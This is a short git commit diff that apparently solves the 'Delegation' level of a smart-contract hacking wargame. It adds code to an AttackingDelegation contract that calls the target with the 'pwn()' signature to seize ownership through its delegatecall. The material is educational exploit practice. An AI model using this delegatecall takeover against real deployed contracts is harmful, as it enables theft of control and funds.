e7a9076323a87b6b61e7963746e3799c6fd0eeca
maks-p <mpazuniak@gmail.com>
2022-07-20 20:35:46 -0400

    Complete Delegation

--- contracts/2. Delegation/AttackingDelegation.sol
+++ contracts/2. Delegation/AttackingDelegation.sol
@@ -2,6 +2,8 @@
 pragma solidity ^0.8.9;
 import "./Delegation.sol";
 
+error AttackingDelegation__CallUnsuccessful();
+
 contract AttackingDelegation {
     address public contractAddress;
 
@@ -11,5 +13,10 @@ contract AttackingDelegation {
 
     function hackContract() external {
         // Code me!
+        (bool success, ) = contractAddress.call(abi.encodeWithSignature("pwn()"));
+        
+        if (!success) {
+            revert AttackingDelegation__CallUnsuccessful();
+        }
     }
 }
